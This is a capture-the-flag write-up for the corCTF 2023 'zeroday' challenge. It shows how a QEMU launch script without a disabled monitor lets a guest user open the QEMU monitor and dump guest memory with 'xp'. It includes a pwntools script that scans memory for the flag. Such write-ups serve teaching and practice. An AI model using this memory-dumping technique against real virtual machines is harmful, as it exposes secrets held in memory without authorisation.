---
title: "Zeroday Corctf2023"
date: 2023-07-31T15:36:08+02:00
author: l0w3
---

## Pwn/zeroday (25 solves / 220 points)

>corCTF is proud to introduce our new zero-day submission service. Simply test out your 0-days here, and we will sell evaluate them for you.

>NOTE: exploiting zero-days in the service is not allowed! our run configuration is proprietary, so please do not monitor or look at it!

### Introduction

This came along with a .zip file, where we could see a **bzImage** file, a **run.sh** file and a **initramfs.cpio.gz** file. Upon examining the **run.sh** script, it appears to be a Kernel exploiting. It turns out it was not, and thanks to the note the challenge does, and some indications from my teammate @l00p3r, I figured out that it was not about Kernel, but about the Monitor mode on QEMU

```bash
#!/bin/sh

qemu-system-x86_64 \
    -m 128M \
    -nographic \
    -kernel "./bzImage" \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on" \
    -no-reboot \
    -cpu qemu64,+smep,+smap \
    -smp 2 \
    -initrd "./initramfs.cpio.gz"
```

As we see, there is no `-monitor dev/null` option set, meaning we can access some cool features from the qemu emulator that are intended for debugging prupposes, but can be used in out favor aswell.

### Exploiting

Looking at the [qemu monitor docs](https://qemu-project.gitlab.io/qemu/system/monitor.html) we can access to the monitor mode from a session pressing the combination of _ctrl+A_ _c_. Once pressed, we see that the promt changes:

```bash
ctf@(none):~$ QEMU 8.0.3 monitor - type 'help' for more informatin
(qemu)
```
The `(qemu)` promt indicates us that we are in the monitor mode and we can execute commands from it.

Examining the help menu I found an interesting option: `xp` which will dump memmory. This can be usefull since, assuming that the flag has been loaded into memmory, dumping all it's content will eventually dump the flag. Let's see a quick PoC:

```bash
(qemu) xp /2xg 0x100
0000000000000100: 0xf000ff53f000ec59 0xc00073c0f000ff53
```
This is telling us that at position 0x100, we have the folloging data. Let's see it's content:

```python
from pwn import *

content = b""
content += p64(0xf000ff53f000ec59) + p64(c00073c0f000ff53)
print(content)
```
`b'Y\xec\x00\xf0S\xff\x00\xf0S\xff\x00\xf0\xc0s\x00\xc0'`

With this simple step, if the flag happens to be in the memmory chunck that we specify, we would see the flag. Therefore, now we just have to find it. To do so, I will iterate over the memmory adresses until I get **corctf{** inside the content variable.

```python
from pwn import *

proc = process("./run.sh")
proc.sendline(b"\x01c") # ctrl+a c
proc.recvuntil(b"(qemu)")
print("[+]  Inside Monitor, dumping memmory")

addr = 0x0
while 1:
	print(f"[+] Dumped 0x{addr:x}")
	proc.sendline(f"xp/16384xg 0x{addr:x}") # xp format: /<count><format><bitsize>
	limiter = f"00000{hex(addr)[2]}".encode() # Get rid of annoying spaces and linejumps
	proc.recvuntil(limiter)
	data = proc.recvuntil(b"(qemu", drop=True)
	data = data.split(b"\n")
	content = b""
	for line in data[:-1]:
		w = line.split(b" ")
		content += p64(int(w[1], 16)) + p64(int(w[2], 16))
	if b"corctf{" in content:
		inic = content.find(b"corctf{")
		fin = content.find(b"}\x00")
		flag = content[inic:fin+0x1]
		print(f"[#] Flag found: {flag}")
		break
	addr += 0x20000
```

When running this exploit, it will eventually print out the flag:

```
===SNIP===
[+] Dumped 0x7b60000
[+] Dumped 0x7b80000
[+] Dumped 0x7ba0000
[#] Flag found: b'corctf{test_flag}'
```

That's all.

### Conclusion

This challenge was a bit decieving at first but in the end was quite fun to solve and to investigate about this different aproach towards pwn CTF's which I never saw before (I would consider this type of challenge more of misc rather than pwn). Give it a try if you feel like, it's fun and straightforward once you know the trick.

